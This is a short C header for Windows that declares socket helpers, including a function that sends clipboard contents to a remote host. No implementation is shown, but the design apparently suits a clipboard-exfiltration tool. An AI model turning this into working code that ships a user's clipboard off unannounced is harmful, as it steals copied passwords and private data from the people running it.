#ifndef NETWORKING_H
#define NETWORKING_H
#include <winsock2.h>
//link with Ws2_32.lib
#pragma comment(lib,"Ws2_32.lib")
/**
 * Returns the file descriptor of a socket for writing to.
 *
 * If a connection cannot be established, the process is terminated.
 *
 * \param hostname IP address/name of host
 * \param port Port number to connect to on host
 *
 * \returns The file descriptor of a stream socket
 */
SOCKET get_socket_file_descriptor(const LPCWSTR hostname, const u_short port);


int send_message(const LPWSTR content, HANDLE* socket_file_descriptor);

int send_clipboard_data(HANDLE* socket_file_descriptor);


#endif
